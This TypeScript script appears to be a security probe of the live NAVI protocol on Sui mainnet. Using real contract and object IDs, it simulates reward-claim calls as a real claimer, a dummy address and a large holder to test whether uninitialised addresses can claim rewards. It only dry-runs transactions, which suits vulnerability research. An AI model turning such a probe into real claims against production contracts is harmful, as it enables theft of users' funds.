/**
 * NAVI v3 vulnerability test using the LATEST package (0x1e4a13a0...)
 * Tests if claim_reward_entry has uninitialized user_index vulnerability.
 */
import { SuiClient } from "@mysten/sui/client";
import { Transaction } from "@mysten/sui/transactions";
import { bcs } from "@mysten/sui/bcs";

const client = new SuiClient({ url: "https://fullnode.mainnet.sui.io:443" });

const LATEST_PKG = "0x1e4a13a0494d5facdbe8473e74127b838c2d446ecec0ce262e2eddafa77259cb";
const CLOCK = "0x0000000000000000000000000000000000000000000000000000000000000006";
const INCENTIVE_V3 = "0x62982dad27fb10bb314b3384d5de8d2ac2d72ab2dbeae5d801dbdb9efa816c80";
const STORAGE = "0xbb4e2f4b6205c2e2a2db47aeb4f830796ec7c005f88537ee775986639bc442fe";
const REWARD_FUND_CERT = "0x7093cf7549d5e5b35bfde2177223d1050f71655c7f676a5e610ee70eb4d93b5c";
const CERT_TYPE = "0x549e8b69270defbfafd4f94e17ec44cdbdd99820b33bda2278dea3b9a32d3f55::cert::CERT";
const CERT_RULE_1 = "0xda416fe656205ece152240771fe58b301d0c9a0ae43817b7f0cc0faa2742a60e";
const CERT_RULE_2 = "0xae82946d6cae4d5e7a779325394959fd7c2505405de71b2c01a2aac6ec3ab9da";
const USDC_TYPE = "0xdba34672e30cb065b1f93e3ab55318768fd6fef66c15942c9f7cb846e2f900e7::usdc::USDC";

const DUMMY = "0x0000000000000000000000000000000000000000000000000000000000001337";
const REAL_CLAIMER = "0x374e0ef6e83118c22735dbb34d6c762b7bf26197757b6918086bedb65310fab3";
const NAVI_WHALE = "0x7861f12c652dbcf96589413cf5cbc5ebcccd85c2c9f09c25fee76f2a218195c9";

async function main() {
  // Check if LATEST_PKG has claim_reward_entry
  console.log("=== LATEST_PKG incentive_v3 entry functions ===");
  try {
    const mod = await client.getNormalizedMoveModulesByPackage({ package: LATEST_PKG });
    const v3 = mod["incentive_v3"];
    if (v3) {
      const entries = Object.entries(v3.exposedFunctions).filter(([_, f]) => (f as any).isEntry);
      for (const [name] of entries) console.log(`  [entry] ${name}`);
    } else {
      console.log("  No incentive_v3 module in LATEST_PKG");
      // List all modules
      console.log("  Modules:", Object.keys(mod).join(", "));
    }
  } catch (e: any) {
    console.log("Error:", e.message?.slice(0, 100));
  }

  // INCENTIVE_V3 version
  const iv3 = await client.getObject({ id: INCENTIVE_V3, options: { showContent: true } });
  const iv3Version = (iv3.data?.content as any)?.fields?.version;
  console.log(`\nINCENTIVE_V3.version: ${iv3Version}`);

  // Test claim_reward_entry with LATEST_PKG
  for (const [label, sender] of [
    ["Real claimer (baseline)", REAL_CLAIMER],
    ["DUMMY fresh address", DUMMY],
    ["NAVI whale", NAVI_WHALE],
  ]) {
    console.log(`\n=== ${label} (LATEST_PKG) ===`);

    const tx = new Transaction();
    tx.setSender(sender as string);

    // BCS encode vector<String> as vector<bytes> (each string is its utf8 bytes prefixed by length)
    const coinTypesBcs = bcs.vector(bcs.string()).serialize([CERT_TYPE, USDC_TYPE]).toBytes();
    const ruleIdsBcs = bcs.vector(bcs.fixedArray(32, bcs.u8())).serialize([
      hexToBytes(CERT_RULE_1.slice(2).padStart(64, "0")),
      hexToBytes(CERT_RULE_2.slice(2).padStart(64, "0")),
    ]).toBytes();

    tx.moveCall({
      target: `${LATEST_PKG}::incentive_v3::claim_reward_entry`,
      typeArguments: [CERT_TYPE],
      arguments: [
        tx.object(CLOCK),
        tx.object(INCENTIVE_V3),
        tx.object(STORAGE),
        tx.object(REWARD_FUND_CERT),
        tx.pure(coinTypesBcs),
        tx.pure(ruleIdsBcs),
      ],
    });

    const r = await client.devInspectTransactionBlock({ transactionBlock: tx, sender: sender as string });
    const status = r.effects?.status?.status;
    const error = r.effects?.status?.error ?? "";

    console.log(`  Status: ${status}`);
    if (status === "success") {
      const events = r.events?.filter((e: any) => e.type.includes("RewardClaimed")) ?? [];
      if (events.length > 0) {
        const pj = events[0].parsedJson as any;
        console.log(`  ✅ RewardClaimed: user=${pj.user?.slice(0,24)} claimed=${pj.total_claimed}`);
        console.log(`     rule_indices: ${JSON.stringify(pj.rule_indices)}`);
        if (pj.total_claimed && Number(pj.total_claimed) > 0) {
          console.log(`  ⚠️  VULNERABILITY: fresh address can claim ${pj.total_claimed} tokens!`);
        }
      } else {
        console.log("  ✅ Success (no reward events — likely 0 balance or already claimed)");
      }
    } else {
      console.log(`  Error: ${error.slice(0, 150)}`);
      const fn = error.match(/function_name: Some\("([^"]+)"\)/)?.[1];
      const code = error.match(/}, (\d+)\)/)?.[1];
      if (fn) console.log(`  → aborted in ${fn}() code=${code}`);
      if (error.includes("version")) console.log("  → VERSION GUARD fires ✓ (safe)");
    }
  }
}

function hexToBytes(hex: string): number[] {
  const bytes: number[] = [];
  for (let i = 0; i < hex.length; i += 2) bytes.push(parseInt(hex.slice(i, i + 2), 16));
  return bytes;
}

main().catch(console.error);
